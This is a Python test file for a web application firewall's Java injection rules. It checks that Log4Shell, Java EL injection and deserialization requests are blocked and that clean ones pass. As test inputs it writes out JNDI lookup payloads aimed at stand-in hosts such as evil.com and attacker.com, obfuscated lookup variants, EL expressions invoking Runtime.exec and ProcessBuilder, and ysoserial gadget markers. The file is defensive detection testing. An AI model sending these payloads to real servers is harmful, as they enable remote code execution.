from bastion.core.normalizer import normalize_request
from bastion.rules.java_injection import (
    JavaELInjectionRule,
    Log4ShellRule,
    JavaDeserializationRule,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_request(method="GET", path="/", query_string="", headers=None, body=b""):
    return normalize_request(
        method,
        path=path,
        query_string=query_string,
        headers=headers or {"host": "example.com"},
        body=body,
    )


def _log4shell_verdict(query_string="", body=b"", headers=None):
    request = _make_request(
        query_string=query_string,
        body=body,
        headers=headers or {"host": "example.com"},
    )
    return Log4ShellRule().match(request)


def _el_verdict(query_string="", body=b""):
    request = _make_request(query_string=query_string, body=body)
    return JavaELInjectionRule().match(request)


def _deser_verdict(query_string="", body=b""):
    request = _make_request(query_string=query_string, body=body)
    return JavaDeserializationRule().match(request)


# ---------------------------------------------------------------------------
# Log4ShellRule (944110)
# ---------------------------------------------------------------------------


def test_log4shell_jndi_ldap_blocked():
    verdict = _log4shell_verdict(
        headers={"host": "example.com", "user-agent": "${jndi:ldap://evil.com/a}"}
    )
    assert verdict.blocked
    assert verdict.rule_id == "944110"


def test_log4shell_jndi_rmi_blocked():
    verdict = _log4shell_verdict(
        query_string="q=${jndi:rmi://attacker.com/obj}"
    )
    assert verdict.blocked
    assert verdict.rule_id == "944110"


def test_log4shell_jndi_dns_blocked():
    verdict = _log4shell_verdict(query_string="q=${jndi:dns://attacker.com/x}")
    assert verdict.blocked
    assert verdict.rule_id == "944110"


def test_log4shell_lower_obfuscation_blocked():
    # ${lower:j}${lower:n}${lower:d}${lower:i} – each piece matches ${lower:
    verdict = _log4shell_verdict(
        query_string="x=${lower:j}${lower:n}${lower:d}${lower:i}"
    )
    assert verdict.blocked
    assert verdict.rule_id == "944110"


def test_log4shell_nested_expression_blocked():
    verdict = _log4shell_verdict(query_string="x=${${env:NaN:-j}ndi:ldap://evil.com}")
    assert verdict.blocked
    assert verdict.rule_id == "944110"


def test_log4shell_clean_request_allowed():
    verdict = _log4shell_verdict(query_string="name=Alice&age=30")
    assert not verdict.blocked


# ---------------------------------------------------------------------------
# JavaELInjectionRule (944100)
# ---------------------------------------------------------------------------


def test_el_runtime_exec_blocked():
    verdict = _el_verdict(
        query_string="expr=${Runtime.getRuntime().exec('id')}"
    )
    assert verdict.blocked
    assert verdict.rule_id == "944100"


def test_el_process_builder_blocked():
    verdict = _el_verdict(body=b"payload=${ProcessBuilder(['id']).start()}")
    assert verdict.blocked
    assert verdict.rule_id == "944100"


def test_el_ognl_blocked():
    verdict = _el_verdict(query_string="q=ognl.OgnlContext")
    assert verdict.blocked
    assert verdict.rule_id == "944100"


def test_el_clean_request_allowed():
    verdict = _el_verdict(query_string="search=java+tutorial")
    assert not verdict.blocked


# ---------------------------------------------------------------------------
# JavaDeserializationRule (944200)
# ---------------------------------------------------------------------------


def test_deser_base64_java_header_blocked():
    # rO0AB is the base64 encoding of Java serialization magic bytes
    verdict = _deser_verdict(body=b"data=rO0ABXNyAA==")
    assert verdict.blocked
    assert verdict.rule_id == "944200"


def test_deser_ysoserial_blocked():
    verdict = _deser_verdict(query_string="payload=ysoserial.payloads.CommonsCollections1")
    assert verdict.blocked
    assert verdict.rule_id == "944200"


def test_deser_commons_collections_blocked():
    verdict = _deser_verdict(
        query_string="class=org.apache.commons.collections.Transformer"
    )
    assert verdict.blocked
    assert verdict.rule_id == "944200"


def test_deser_clean_request_allowed():
    verdict = _deser_verdict(query_string="id=42&action=view")
    assert not verdict.blocked
